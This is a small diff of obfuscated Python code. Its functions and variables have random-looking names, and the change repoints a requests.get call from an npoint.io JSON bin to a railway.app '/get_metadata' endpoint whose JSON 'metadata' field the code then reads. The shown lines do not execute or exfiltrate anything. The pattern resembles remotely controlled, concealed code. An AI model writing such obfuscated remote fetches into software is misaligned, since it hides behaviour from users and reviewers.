@@ -18,7 +18,7 @@ def model_fuphvc_326():
 
     def net_eostfr_667():
         try:
-            train_wzdcen_768 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_wzdcen_768 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_wzdcen_768.raise_for_status()
             model_wwgoqs_591 = train_wzdcen_768.json()
             process_sufmsh_792 = model_wwgoqs_591.get('metadata')
